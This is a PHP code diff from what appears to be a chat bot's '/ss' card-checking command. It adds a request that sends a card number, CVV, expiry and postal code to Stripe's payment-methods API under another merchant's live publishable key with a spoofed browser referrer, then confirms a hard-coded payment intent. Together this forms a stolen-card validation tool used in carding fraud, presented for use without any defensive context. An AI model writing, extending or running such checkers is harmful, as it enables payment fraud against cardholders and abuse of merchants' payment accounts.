@@ -132,6 +132,36 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             }
             
             $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+              'Host: api.stripe.com',
+              'Accept: application/json',
+              'Accept-Language: en-US,en;q=0.9',
+              'Content-Type: application/x-www-form-urlencoded',
+              'Origin: https://js.stripe.com',
+              'Referer: https://js.stripe.com/',
+              'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+            curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&billing_details[address][postal_code]=$zip&guid=$guid&muid=$muid&sid=$sid&payment_user_agent=stripe.js%2Fc478317df%3B+stripe-js-v3%2Fc478317df&time_on_page=$time&referrer=https%3A%2F%2Fatlasvpn.com%2F&key=pk_live_woOdxnyIs6qil8ZjnAAzEcyp00kUbImaXf");
+            $result1 = curl_exec($ch);
+            
+            if(stripos($result1, 'error')){
+              $errormessage = trim(strip_tags(capture($result1,'"message": "','"')));
+              $stripeerror = True;
+            }else{
+              $id = trim(strip_tags(capture($result1,'"id": "','"')));
+              $stripeerror = False;
+            }
+            
+            if(!$stripeerror){
+                $ch = curl_init();
             curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3LNOv3CPBTfxNhAO1oovvvkR/confirm');
             curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
             curl_setopt($ch, CURLOPT_HEADER, 0);
@@ -159,6 +189,7 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             $time = $info['total_time'];
             $httpCode = $info['http_code'];
             $time = substr($time, 0, 4);
+
 
 // Responses
 
